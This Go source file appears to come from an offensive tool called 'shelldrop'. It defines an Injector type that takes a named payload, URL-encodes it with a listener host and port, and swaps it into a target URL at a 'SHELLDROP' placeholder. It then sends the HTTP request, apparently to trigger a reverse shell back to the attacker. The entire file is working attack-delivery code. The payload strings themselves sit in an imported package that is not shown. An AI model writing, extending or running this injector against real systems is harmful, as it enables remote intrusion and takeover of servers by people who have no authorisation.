package main

import (
	"net/http"
	"shelldrop/payloads"
	"strings"
)

type (
	Injector struct {
		listenerConfig ListenerConfig
		method         string
		url            string
		payloadName    string
	}
)

func NewInjector(payloadName string) *Injector {
	return &Injector{
		method:      "GET",
		payloadName: payloadName,
	}
}

func (i *Injector) Do() error {
	url := i.setPayload(i.url)

	req, err := http.NewRequest(i.method, url, nil)
	if err != nil {
		return err
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func (i *Injector) WithListenerConfig(listenerConfig ListenerConfig) *Injector {
	i.listenerConfig = listenerConfig
	return i
}

func (i *Injector) WithUrl(url string) *Injector {
	i.url = url
	return i
}

func (i *Injector) setPayload(value string) string {
	payload := payloads.GetUrlEncoded(i.payloadName, i.listenerConfig.Host, i.listenerConfig.Port)
	return strings.Replace(value, "SHELLDROP", payload, -1)
}
